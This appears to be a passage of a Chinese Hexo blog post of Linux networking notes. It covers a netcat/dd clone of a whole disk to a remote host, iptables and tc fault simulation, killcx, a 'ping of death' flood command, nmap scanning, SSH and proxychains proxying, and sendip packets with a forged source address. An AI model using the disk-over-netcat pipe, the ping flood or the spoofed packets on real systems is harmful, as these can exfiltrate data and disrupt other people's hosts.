+<h3 id="远程硬盘克隆-块级别拷贝"><a href="#远程硬盘克隆-块级别拷贝" class="headerlink" title="远程硬盘克隆(块级别拷贝)"></a>远程硬盘克隆(块级别拷贝)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 333| dd of=/dev/sda</span><br><span class="line">B:dd if=/dev/sda|nc -nv 1.1.1.1 333</span><br></pre></td></tr></table></figure>
+
+<h1 id="异常模拟"><a href="#异常模拟" class="headerlink" title="异常模拟"></a>异常模拟</h1><h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>service iptables status<br>service iptables start<br>iptables -I FORWARD -p tcp –dport 3306 -j DROP<br>iptables -I FORWARD -p tcp –dport 3306 -j ACCEPT<br>1、iptables -L<br>查看filter表的iptables规则，包括所有的链。filter表包含INPUT、OUTPUT、FORWARD三个规则链。<br>说明：-L是–list的简写，作用是列出规则。<br>2、iptables -L [-t 表名]<br>只查看某个表的中的规则。<br>说明：表名一共有三个：filter,nat,mangle，如果没有指定表名，则默认查看filter表的规则列表（就相当于第一条命令）。<br>举例：iptables -L -t filter</p>
+<h2 id="tc"><a href="#tc" class="headerlink" title="tc"></a>tc</h2><p>在某些情况下，我们需要模拟网络很差的状态来测试软件能够正常工作，比如网络延迟、丢包、乱序、重复等</p>
+<p><a href="https://www.hi-linux.com/posts/35699.html" target="_blank" rel="noopener">https://www.hi-linux.com/posts/35699.html</a></p>
+<h2 id="killcx"><a href="#killcx" class="headerlink" title="killcx"></a>killcx</h2><p>Linux环境下切断tcp连接,google搜索关键字:“close””tcp connection””linus”,开发调试的时候，为了模拟意外情况，需要在不影响服务进程的情况下单独 切断tcp连接,即 强制断开tcp连接。不能使用iptables,因为iptables的禁用对已经建立的tcp连接无效（这是由tcp的机制决定的）</p>
+<h3 id="Centos安装"><a href="#Centos安装" class="headerlink" title="Centos安装"></a>Centos安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://ftp.tu-chemnitz.de/pub/linux/dag/redhat/el6/en/x86_64/rpmforge/RPMS/perl-Net-RawIP-0.25-1.el6.rf.x86_64.rpm</span><br><span class="line">rpm -ivh perl-Net-RawIP-0.25-1.el6.rf.x86_64.rpm</span><br><span class="line">yum -y install perl-Net-Pcap.x86_64</span><br><span class="line">yum  -y install perl-NetPacket.noarch</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><code>perl killcx 127.0.0.1:1234 lo</code></p>
+<h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><p><a href="https://cibifang.com/linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%A6%82%E4%BD%95%E5%88%87%E6%96%ADtcp%E8%BF%9E%E6%8E%A5/" target="_blank" rel="noopener">切断tcp连接,在linux环境下</a><br><a href="http://killcx.sourceforge.net/" target="_blank" rel="noopener">Killcx : close a TCP connection (for Linux)</a></p>
+<h1 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h1><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><h3 id="死亡ping"><a href="#死亡ping" class="headerlink" title="死亡ping"></a>死亡ping</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每0.01秒给192.168.10.147发送一个大小65500字节的icmp包</span></span><br><span class="line">ping 192.168.10.147 -i 0.01 -s 65500</span><br></pre></td></tr></table></figure>
+
+<h3 id="发送指定个数icmp数据包"><a href="#发送指定个数icmp数据包" class="headerlink" title="发送指定个数icmp数据包"></a>发送指定个数icmp数据包</h3><p>ping -c 3（ping3次） -q（不打出输出信息） <a href="http://www.baidu.com(网址)" target="_blank" rel="noopener">www.baidu.com(网址)</a></p>
+<h2 id="fping"><a href="#fping" class="headerlink" title="fping"></a>fping</h2><h2 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h2><h2 id="arping"><a href="#arping" class="headerlink" title="arping"></a>arping</h2><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bzip2 -cd nmap-7.60.tar.bz2 | tar xvf -</span><br><span class="line">cd nmap-7.60</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">su root</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://nmap.org/download.html#macosx" target="_blank" rel="noopener">安装</a></p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><a href="https://zhuanlan.zhihu.com/p/26676508" target="_blank" rel="noopener">【渗透神器系列】nmap</a></p>
+<p>扫描局域网内ip地址：</p>
+<p><code>nmap -sP 本地IP/24</code></p>
+<p>nmap -F -sT -v <a href="http://www.quar.com" target="_blank" rel="noopener">www.quar.com</a></p>
+<h1 id="代理转发"><a href="#代理转发" class="headerlink" title="代理转发"></a>代理转发</h1><h2 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h2><p>proxychains</p>
+<ul>
+<li>安装<br><a href="https://blog.csdn.net/weixin_42135399/article/details/82706083" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42135399/article/details/82706083</a></li>
+<li>测试：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https://www.google.com/</span><br><span class="line">proxychains curl https://www.google.com/</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>实用socket5代理请求<br>ssh -qtfnN -D 127.0.0.1:1080 <a href="mailto:root@192.168.10.1" target="_blank" rel="noopener">root@192.168.10.1</a><br><a href="https://zhuanlan.zhihu.com/p/57630633" target="_blank" rel="noopener">ssh命令的三项代理功能</a></p>
+<p>-q<br>Quiet mode. Causes most warning and diagnostic messages to be suppressed.<br>-T<br>Disable pseudo-terminal allocation.<br>-D<br>[bind_address:]port]<br>-f<br>Requests ssh to go to background just before command execution. This is useful if ssh is going to ask for passwords or passphrases, but the user wants it in the background. This implies -n. The recommended way to start X11 pro-grams at a remote site is with something like ssh -f host xterm.If the ExitOnForwardFailure configuration option is set to ``yes’’, then a client started with -f will wait for all remote port forwards to be successfully established before placing itself in the background<br>-n<br>Redirects stdin from /dev/null (actually, prevents reading from stdin). This must be used when ssh is run in the background. A common trick is to use this to run X11 programs on a remote machine. For example, ssh -nshadows.cs.hut.fi emacs &amp; will start an emacs on shadows.cs.hut.fi, and the X11 connection will be automatically forwarded over an encrypted channel. The ssh program will be put in the background. (This does not work if ssh needs to ask for a password or passphrase; see also the -f option.)<br>-N<br>Do not execute a remote command. This is useful for just forwarding ports.</p>
+<h1 id="实用工具"><a href="#实用工具" class="headerlink" title="实用工具"></a>实用工具</h1><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><h2 id="sendip"><a href="#sendip" class="headerlink" title="sendip"></a>sendip</h2><p>linux网络IP发包工具</p>
+<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># http://www.earth.li/projectpurple/progs/sendip.html</span><br><span class="line">rpm -ivh sendip-2.5-1.i386.rpm</span><br><span class="line">error: Failed dependencies:</span><br><span class="line">    libc.so.6 is needed by sendip-2.5-1.i386</span><br><span class="line">    libc.so.6(GLIBC_2.0) is needed by sendip-2.5-1.i386</span><br><span class="line">    libc.so.6(GLIBC_2.1) is needed by sendip-2.5-1.i386</span><br><span class="line">    libc.so.6(GLIBC_2.1.3) is needed by sendip-2.5-1.i386</span><br><span class="line">    libc.so.6(GLIBC_2.3) is needed by sendip-2.5-1.i386</span><br><span class="line">    libdl.so.2 is needed by sendip-2.5-1.i386</span><br><span class="line">    libdl.so.2(GLIBC_2.0) is needed by sendip-2.5-1.i386</span><br><span class="line">    libdl.so.2(GLIBC_2.1) is needed by sendip-2.5-1.i386</span><br><span class="line">    libm.so.6 is needed by sendip-2.5-1.i386</span><br><span class="line">需要升级gcc版本</span><br><span class="line">gcc version 4.8.3 (GCC)可以安装</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p><a href="https://blog.csdn.net/freexploit/article/details/503954" target="_blank" rel="noopener">https://blog.csdn.net/freexploit/article/details/503954</a><br><a href="https://blog.csdn.net/zh_94/article/details/81660184" target="_blank" rel="noopener">https://blog.csdn.net/zh_94/article/details/81660184</a></p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul>
+<li>不能发送连续的数据包，所以需要配合脚本实现</li>
+<li>使用-v查看包是否正常<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sendip -p ipv4 -is 192.168.1.2 -id 192.168.1.1 -p icmp -d -x89ABCDEF www.baidu.com</span><br><span class="line">[root@server /tmp]#</span><br><span class="line">[root@server /tmp]# sendip -v -p ipv4 -is 192.168.1.2 -id 192.168.1.1 -p icmp -d -x89ABCDEF www.baidu.com</span><br><span class="line">Added 25 options</span><br><span class="line">Initializing module ipv4</span><br><span class="line">Initializing module icmp</span><br><span class="line">Finalizing module icmp</span><br><span class="line">Finalizing module ipv4</span><br><span class="line">Final packet data:</span><br><span class="line">45 00 00 22 E..&quot;</span><br><span class="line">E5 D2 00 00 ....</span><br><span class="line">FF 01 52 B4 ..R.</span><br><span class="line">C0 A8 01 02 ....</span><br><span class="line">C0 A8 01 01 ....</span><br><span class="line">08 00 C8 81 ....</span><br><span class="line">2D 78 38 39 -x89</span><br><span class="line">41 42 43 44 ABCD</span><br><span class="line">45 46 EF</span><br><span class="line">Sent 34 bytes to www.baidu.com</span><br><span class="line">Freeing module ipv4</span><br><span class="line">Freeing module icmp</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Linux-网络命令/" <i class="fa fa-tag"> Linux 网络命令</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/28/Linux/nas/" rel="next" title>
+                <i class="fa fa-chevron-left"></i> 
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/12/28/Linux/技巧/" rel="prev" title>
+                 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="John Doe">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">78</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#网络配置"><span class="nav-number">1.</span> <span class="nav-text">网络配置</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ethtool"><span class="nav-number">1.1.</span> <span class="nav-text">ethtool</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ifconfig"><span class="nav-number">1.2.</span> <span class="nav-text">ifconfig</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ifconfig-ifup-ifdown"><span class="nav-number">1.3.</span> <span class="nav-text">ifconfig ifup ifdown</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dhclinet"><span class="nav-number">1.4.</span> <span class="nav-text">dhclinet</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#域名路由"><span class="nav-number">2.</span> <span class="nav-text">域名路由</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#route"><span class="nav-number">2.1.</span> <span class="nav-text">route</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#netstat"><span class="nav-number">2.2.</span> <span class="nav-text">netstat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dig"><span class="nav-number">2.3.</span> <span class="nav-text">dig</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#控制输出"><span class="nav-number">2.3.1.</span> <span class="nav-text">控制输出</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#网络连接"><span class="nav-number">3.</span> <span class="nav-text">网络连接</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ss"><span class="nav-number">3.1.</span> <span class="nav-text">ss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#查看开放端口"><span class="nav-number">3.1.1.</span> <span class="nav-text">查看开放端口</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#netstat-1"><span class="nav-number">3.2.</span> <span class="nav-text">netstat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lsof"><span class="nav-number">3.3.</span> <span class="nav-text">lsof</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#流量统计"><span class="nav-number">4.</span> <span class="nav-text">流量统计</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#iftop"><span class="nav-number">4.1.</span> <span class="nav-text">iftop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nsload"><span class="nav-number">4.2.</span> <span class="nav-text">nsload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#网络抓包"><span class="nav-number">5.</span> <span class="nav-text">网络抓包</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#tshark"><span class="nav-number">5.1.</span> <span class="nav-text">tshark</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcpdump"><span class="nav-number">5.2.</span> <span class="nav-text">tcpdump</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#tcpdump复杂过滤规则"><span class="nav-number">5.2.1.</span> <span class="nav-text">tcpdump复杂过滤规则</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ngrep"><span class="nav-number">5.3.</span> <span class="nav-text">ngrep</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件传输"><span class="nav-number">6.</span> <span class="nav-text">文件传输</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#scp"><span class="nav-number">6.1.</span> <span class="nav-text">scp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sftp命令"><span class="nav-number">6.2.</span> <span class="nav-text">sftp命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nc"><span class="nav-number">6.3.</span> <span class="nav-text">nc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#传输文件"><span class="nav-number">6.3.1.</span> <span class="nav-text">传输文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#主机A传输数据到主机B"><span class="nav-number">6.3.1.1.</span> <span class="nav-text">主机A传输数据到主机B</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#正向传输"><span class="nav-number">6.3.1.1.1.</span> <span class="nav-text">正向传输</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反向传输"><span class="nav-number">6.3.1.1.2.</span> <span class="nav-text">反向传输</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#主机B传输数据到主机A"><span class="nav-number">6.3.1.2.</span> <span class="nav-text">主机B传输数据到主机A</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件打包压缩后传输"><span class="nav-number">6.3.2.</span> <span class="nav-text">文件打包压缩后传输</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#端口扫描"><span class="nav-number">6.3.3.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程控制-反弹shell"><span class="nav-number">6.3.4.</span> <span class="nav-text">远程控制(反弹shell)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程硬盘克隆-块级别拷贝"><span class="nav-number">6.3.5.</span> <span class="nav-text">远程硬盘克隆(块级别拷贝)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#异常模拟"><span class="nav-number">7.</span> <span class="nav-text">异常模拟</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#iptables"><span class="nav-number">7.1.</span> <span class="nav-text">iptables</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tc"><span class="nav-number">7.2.</span> <span class="nav-text">tc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#killcx"><span class="nav-number">7.3.</span> <span class="nav-text">killcx</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Centos安装"><span class="nav-number">7.3.1.</span> <span class="nav-text">Centos安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用"><span class="nav-number">7.3.2.</span> <span class="nav-text">使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文档"><span class="nav-number">7.3.3.</span> <span class="nav-text">参考文档</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#网络安全"><span class="nav-number">8.</span> <span class="nav-text">网络安全</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ping"><span class="nav-number">8.1.</span> <span class="nav-text">ping</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#死亡ping"><span class="nav-number">8.1.1.</span> <span class="nav-text">死亡ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#发送指定个数icmp数据包"><span class="nav-number">8.1.2.</span> <span class="nav-text">发送指定个数icmp数据包</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fping"><span class="nav-number">8.2.</span> <span class="nav-text">fping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hping3"><span class="nav-number">8.3.</span> <span class="nav-text">hping3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#arping"><span class="nav-number">8.4.</span> <span class="nav-text">arping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap"><span class="nav-number">8.5.</span> <span class="nav-text">nmap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#安装"><span class="nav-number">8.5.1.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他"><span class="nav-number">8.5.2.</span> <span class="nav-text">其他</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#代理转发"><span class="nav-number">9.</span> <span class="nav-text">代理转发</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#proxychains"><span class="nav-number">9.1.</span> <span class="nav-text">proxychains</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh"><span class="nav-number">9.2.</span> <span class="nav-text">ssh</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实用工具"><span class="nav-number">10.</span> <span class="nav-text">实用工具</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#curl"><span class="nav-number">10.1.</span> <span class="nav-text">curl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sendip"><span class="nav-number">10.2.</span> <span class="nav-text">sendip</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#安装-1"><span class="nav-number">10.2.1.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用-1"><span class="nav-number">10.2.2.</span> <span class="nav-text">使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注意"><span class="nav-number">10.2.3.</span> <span class="nav-text">注意</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+  <span class="post-meta-divider">|</span>
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共字</span>
+</div>
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
